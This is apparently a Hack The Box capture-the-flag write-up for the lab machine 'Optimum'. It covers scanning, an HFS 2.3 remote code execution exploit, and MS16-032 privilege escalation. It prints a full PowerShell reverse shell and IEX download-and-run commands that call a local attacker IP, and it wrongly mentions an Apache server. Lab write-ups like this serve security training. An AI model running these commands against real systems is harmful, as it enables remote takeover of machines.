![logo](/logo.png)

# [Optimum- BOX]  
Hi folks, today I am going to solve an Easy rated hack the box machine which was released on 18 Mar 2017 as the fifth machine on HTB,Optimum created by ch4p.So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *HFS
  *HttpFileserver
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/optimum 10.10.10.8
```

###### Output 
![](Windows/Windows-Easy/Optimum/Screenshots/nmap.png)
```sh
nmap -sV -sC -oA nmap/optimum 10.10.10.8                                                                                          ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-10 14:58 EAT
Nmap scan report for 10.10.10.8
Host is up (0.31s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.03 seconds
```

looking at the results  we find out that there is 1 ports open and its a `HttpFileServer `and its running an `Apache server`. 

port[80]-  httpd 2.3

so looking at the page [http//:10.10.10.8](http://10.10.10.8) we find there is a login page 

![](/Windows/Windows-Easy/Optimum/Screenshots/landingpage.png)

when I try to login with default credential i find out that it fails but when i click at the HttpFileserver 2.3 it redirects to a [rejetto](http://www.rejetto.com/hfs/)

![](Windows/Windows-Easy/Optimum/Screenshots/rejetto.png)

so we decide to search for the exploit 

# Exploitation

```sh
searchsploit HttpFileServer 2.3
```

![](/Windows/Windows-Easy/Optimum/Screenshots/searchsploit.png)

as we can see their is an RCE exploit a python script so we examine the file

![](/Windows/Windows-Easy/Optimum/Screenshots/exploit.png)

we can see that it exploits with the `%00`  null bytes but this scripts generates for us a url to execute a reverse shell on the machine.

```sh
python3 49125.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.9/optimumpowershell.ps1')"
```

so we create a powershell reverse shell so that we can be able to execute and get a shell. You can get search shell from [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) for multiline and one line from [nishang](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1&ved=2ahUKEwidwsWIy-qHAxV4R_EDHS6ZD-kQjBB6BAguEAE&usg=AOvVaw1G_nxxPwS6B_yCRUM4Sd3U)

```sh
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.9',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

now we set a listener so as to get the revershell.

```sh
nc -nvlp 1337
```

then we get the  revershell 

![](/Windows/Windows-Easy/Optimum/Screenshots/reverse.png)

and we navigate with the python script generated above to the browser to get the shell.

![](/Windows/Windows-Easy/Optimum/Screenshots/browser.png)

we can then get the user flag from the user `kostas`

![](/Windows/Windows-Easy/Optimum/Screenshots/userflag.png)

now that we get to find the user flag we can now do a privillage escalation to find the root flag 

# Privillage Escalation

Just by looking at the `systeminfo` we get that their are hot fixes that where done to the machine

![](/Windows/Windows-Easy/Optimum/Screenshots/hotfix.png)

Now we search and find that their is script that checks for vulnerablitities of missing software patches for local privilege escalation vulnerabilities. [sherlork](https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1) now we save the script and be able to execte if so that we can run.

from the script just copy the function find Allvulns and put at the end of the script them from the session run

```sh
IEX(New-Object Net.webclient).downloadString('http://10.10.14.9:8000/sherlork.ps1')
```

![](/Windows/Windows-Easy/Optimum/Screenshots/sherlork.png)

and it appears that `ms16-032 and some other 2` are vulnerable

![](/Windows/Windows-Easy/Optimum/Screenshots/ms16.png)

so we search for an exploit using searchsploit and we get its vulnerabilty canbe done using different ways 

![](/Windows/Windows-Easy/Optimum/Screenshots/searchsploit2.png)

after examining the code we find that it execute from cmd.exe now we find another exploit from [empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1) which has modification to execte from power shell. We just add the revershell at the end so that we can Invoke from the session again.

![](/Windows/Windows-Easy/Optimum/Screenshots/InvokeMs016.png)
Now after that we set a new listner and we go and execute the from the session with this to get a shell of the `Nt Authority`

```sh
IEX(New-Object Net.webclient).downloadString('http://10.10.14.9:8000/InvokeMs.ps1')
```

![](Windows/Windows-Easy/Optimum/Screenshots/InvokeMs.png)

now after executing that a setting a listner we get root

![](/Windows/Windows-Easy/Optimum/Screenshots/root.png)
now we get the root flag 

![](/Windows/Windows-Easy/Optimum/Screenshots/rootflag.png)

	-------------------------END successful attack @lesley----------------------